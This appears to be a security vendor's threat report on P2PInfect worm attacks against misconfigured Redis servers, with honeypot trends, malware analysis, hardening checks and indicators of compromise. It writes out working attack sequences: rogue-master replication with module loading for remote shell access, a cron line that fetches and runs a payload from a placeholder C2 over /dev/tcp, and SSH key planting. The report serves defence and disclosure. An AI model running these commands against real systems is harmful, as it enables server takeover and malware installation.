@@ -1,0 +1,122 @@
+2026-09-18 (FRIDAY): Redis Instances Abuse
+
+AUTHORS:
+
+Adrian Li Ruian Duan Zhanhao Chen and Daiping Liu
+
+DETAILS:
+
+Technical Analysis
+- We documented P2PInfect in July 2023, when it gained initial access through CVE-2022-0543, the Lua sandbox escape.
+- Between 2026-03-17 and 2026-08-19, our honeypots recorded 692 attacking IPs and 363 C2 servers pushing the same worm through a different entry: Redis misconfiguration.
+- Redis is designed to be accessed by trusted clients inside trusted environments. 
+- An instance left reachable from the internet breaks that assumption. 
+- The full command set becomes available to anyone who connects, including commands that control what Redis writes to disk and what code it loads into memory.
+- In our honeypot data, attackers abuse these to deliver malware to the host through two vectors: SLAVEOF plus module load, and RDB write abuse.
+
+Vector A: SLAVEOF plus module load
+- Redis can extend itself with modules: shared libraries (.so) loaded into its own process at runtime via MODULE LOAD. exp.so is one such module. 
+- Because it runs inside the Redis process, it inherits that process's OS privileges, which on misconfigured deployments means root.
+- In its public form (known as "Redis Rogue Server — A exploit for Redis RCE"), exp.so registers two commands: system.exec (run a shell command, return output) and system.rev (open a reverse shell).
+- The attacker uses CONFIG SET to point the victim's RDB snapshot file at /tmp/exp.so, then SLAVEOF to make it replicate from a rogue master, which sends the malicious shared library in place of a database snapshot:
+   - CONFIG SET rdbcompression yes
+   - CONFIG SET dir /tmp/
+   - CONFIG SET dbfilename exp.so
+   - SLAVEOF {rogue_master_ip} {port}
+   - MODULE LOAD /tmp/exp.so
+   - SLAVEOF NO ONE
+- SLAVEOF connects the victim Redis to the attacker's rogue server, which uses the FULLRESYNC replication protocol to deliver a raw ELF in place of a database snapshot. 
+- The victim writes it to /tmp/exp.so, the path set by the preceding CONFIG SET commands.
+- MODULE LOAD then registers system.exec and system.rev as new Redis commands, running shell commands as the Redis user. The attacker calls system.exec to pull the final payload via GET /linux over a raw TCP socket.
+- After execution, the tool cleans up to minimize on-disk forensic artifacts:
+   - system.exec "rm -rf /tmp/exp.so"
+   - MODULE UNLOAD system
+- This is an anti-forensic step: deleting the file and unloading the module leaves MODULE LIST empty, erasing the most obvious trace of the intrusion.
+- Custom-compiled variants: we ran binary analysis on the two captured exp.so variants and compared them against the canonical binary from "Redis Rogue Server — A exploit for Redis RCE." 
+- Both variants are listed in the IoC. f12feb87… registers the same system.exec and system.rev as the canonical module, while 07933668… registers only rce.exec.
+- The 07933668… variant was compiled against the Redis 6.x SDK and is an independent implementation rather than a recompile. It pulls in four Redis API groups absent from both other modules we analyzed:
+   - Event Subscription API (14 types): monitors Redis lifecycle events
+   - Streams API (9 functions): full read/write access to Redis Streams keyspace
+   - Server Info API (8 functions): queries server version, configuration, runtime stats
+   - Scan API (5 functions): enumerates all keys in the keyspace
+
+Vector B: RDB write abuse
+- The RDB snapshot stores key values as readable strings, and both its path and filename are client-configurable. That turns the database into a file writer: store a string under a key, point dir and dbfilename at a file the operating system already trusts, and call save.
+- Because the RDB dump embeds key values as readable strings, and because the cron and SSH parsers tolerate the surrounding binary noise, the planted line is acted on as if it were a legitimate config entry. 
+- We see this used two ways:
+- Crontab branch: writes to /var/spool/cron/root, where cron picks up a scheduled job that opens a socket to the C2, downloads the payload, and runs it.
+   - set x "\n* * * * * if ! ps | grep -v grep | grep -q {rand};then exec 6<>/dev/tcp/{C2_IP}/{PORT} && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/{rand} ;fi && chmod +x /tmp/{rand} && /tmp/{rand} {base64_config}\n"
+   - config set dir /var/spool/cron/
+   - config set dbfilename root
+   - save
+- SSH branch: writes to /root/.ssh/authorized_keys, adding the attacker's public key for root login.
+   - set x "\n\nssh-rsa {attacker_pubkey} root@localhost.localdomain\n\n"
+   - config set dir /root/.ssh/
+   - config set dbfilename authorized_keys
+   - save
+
+Malware analysis: GET /linux payload
+- Three ELF binaries were downloaded via GET /linux from the C2 servers, but they are one binary: the two smaller samples (a0082c4c…, b302e87d…) are truncated downloads of the third. 
+   - Only the complete binary (976e3772…) can be fully unpacked. 976e3772… does not match any previously published P2PInfect sample, making it a previously unanalyzed variant of the family.
+- Analysis confirms the payload is P2PInfect, a Rust-based peer-to-peer worm documented by us in July 2023. The identification is unambiguous: Rust retains build-time source paths, so the malware author's own project directory is visible as /root/p2pinfect/src/exp/redis.rs, /root/p2pinfect/src/syn_scanner/linux.rs, and others. The crate names p2pinfect::exp and p2pinfect::node appear explicitly.
+- The worm is fully featured: it embeds a Rust SSH client with a brute-force wordlist of 100+ credentials, SYN scans (src/syn_scanner/linux.rs) for new Redis and SSH targets, joins a P2P botnet that pulls signed updates via update_from_botnet_delay_secs (evidenced by InvalidSign/InvalidTime in src/protocol/user_ctl.rs), and can be configured to mine cryptocurrency via the BotNetConf struct's miner field. Every infected host becomes a scanner for the next one.
+
+Trend
+- Between 2026-03-17 and 2026-08-19 we identified 692 attacking source IPs and 363 C2 servers. 
+- The C2 estate is mostly dual-purpose: 218 of the 363 (60%) act as rogue master and payload host. 
+- 138 are rogue master only and 7 are download C2 only.
+- Vector A has run steadily since March, while both Vector B branches rise sharply from July. 
+- In August, 120 new attack IPs arrived via the crontab branch against 93 for Vector A.
+
+How to check your Redis OSS deployment
+- In this report, "misconfigured Redis" refers to a combination of deployment settings that allows an untrusted party to control replication, load modules, or write host files used by cron or SSH. 
+- Contributing settings can include unrestricted network access, missing authentication, overly broad command permissions, disabled safeguards, and excessive OS privileges.
+- Check who can reach Redis: using an authorized administrative connection, identify the running version with INFO server and inspect bind, port, tls-port, and protected-mode using CONFIG GET <setting>, one setting at a time. Review firewall rules, security groups, and published container ports to confirm that only approved clients can reach the actual database listener. 
+- An unexpected reachable endpoint needs investigation; protected-mode yes alone does not establish that network access is correctly restricted. Follow Redis's network security and protected-mode guidance.
+- Check what connected users can do: on Redis 6 and later, inspect the default and application accounts with ACL GETUSER <username>. 
+- Look for enabled nopass accounts and command permissions that exceed each account's role, especially access to CONFIG SET, REPLICAOF/SLAVEOF, MODULE LOAD, and SAVE. 
+- The default user can be passwordless and broadly privileged unless configured otherwise; apply Redis's authentication and least-privilege ACL guidance. 
+- On Redis 7 and later, ACL DRYRUN can check a user's command permissions without executing the command; its result does not test the other protections required for exploitation.
+- Check command safeguards and host permissions: inspect dir and dbfilename, and, where supported, enable-protected-configs and enable-module-command, with CONFIG GET. 
+- Compare them with the configuration reference for your installed Redis version. 
+- In the Redis 7.0.0 reference, setting these to "no" blocks the protected changes or module-loading operations; "yes" and "local" relax those restrictions and should only be used with clear justification. 
+- An unsupported setting is not evidence of protection. Inspect the service account and filesystem or container mounts to confirm Redis runs unprivileged and cannot write root's cron or SSH files, consistent with Redis's OS privilege guidance.
+
+IOCs:
+
+- Malicious Hashes (exp.so):
+cf4c6ac09be225112faaef95316a137eff30e91c0f5f8e7aaf0a4bcc6c76f477
+07933668fe89067cf62fe8dc8d96018320577b8e5cedb2ee6fe09a6b53717cb5
+f12feb8785adcc2413a38e270a6867093d0fb62e08f5538f8a66d22ce60b2bd5
+
+- Malicious Hashes (malware payload):
+976e3772ffea7499f7c119e956a5a71806f8f054caf174978fa888b254dd22a0
+a0082c4cbf2802f65ef7da85ebd8df314c184675180948808bb2aa9f5d873d6f
+b302e87dbb7fadfe38fae7515386a3a00be8030da17589a9e794c88d654e7081
+
+- Attack IP:
+120.79.247[.]255
+101.133.145[.]177
+36.139.41[.]116
+124.236.108[.]172
+103.247.11[.]94
+106.75.16[.]140
+39.108.85[.]106
+124.236.108[.]141
+120.79.155[.]19
+106.12.152[.]213
+
+- C2 IP:
+47.76.183[.]131
+47.242.16[.]134
+121.225.97[.]102
+47.86.176[.]78
+47.83.180[.]158
+47.238.150[.]36
+47.243.189[.]23
+8.210.80[.]120
+47.239.0[.]254
+43.99.83[.]70
+114.67.87[.]14
+
+
